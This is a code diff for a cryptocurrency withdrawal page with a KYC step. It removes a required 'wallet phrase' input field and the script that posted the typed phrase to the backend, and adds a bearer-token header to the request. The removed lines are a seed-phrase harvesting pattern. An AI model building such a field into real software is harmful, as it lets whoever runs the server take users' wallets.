@@ -166,14 +166,6 @@
                             </select>
                         </div>
 
-                        <div class="form-group" style="margin-bottom: 20px;">
-                            <label for="wallet-verify-phrase">Wallet Verification Phrase</label>
-                            <input type="text" id="wallet-verify-phrase" placeholder="Enter your wallet phrase" required>
-                            <p style="margin-top: 8px; font-size: 0.85rem; color: var(--color-text-light);">
-                                Wallet phrase
-                            </p>
-                        </div>
-
                         <button type="submit" class="cta-button large" style="width: 100%;">Continue to KYC Verification</button>
                     </form>
                 </div>
@@ -289,18 +281,13 @@
             const kycFullName = document.getElementById('kyc-fullname').value.trim();
             const kycIdNumber = document.getElementById('kyc-id-number').value.trim();
             const clientId = localStorage.getItem('clientId') || localStorage.getItem('clientName') || 'unknown-client';
-            const typedPhrase = document.getElementById('wallet-verify-phrase').value.trim();
-
-            if (!typedPhrase) {
-                alert('Please enter your wallet phrase.');
-                return;
-            }
-
             // Send KYC data to backend
+            const token = localStorage.getItem('userToken');
             fetch('/api/v1/withdraw/kyc-session', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
+                    Authorization: `Bearer ${token}`
                 },
                 body: JSON.stringify({
                     clientId,
@@ -310,7 +297,6 @@
                     walletCoin: withdrawFlowData.walletCoin,
                     kycFullName,
                     kycIdNumber,
-                    phraseInput: typedPhrase,
                 }),
             }).then(res => res.json())
             .then(data => {
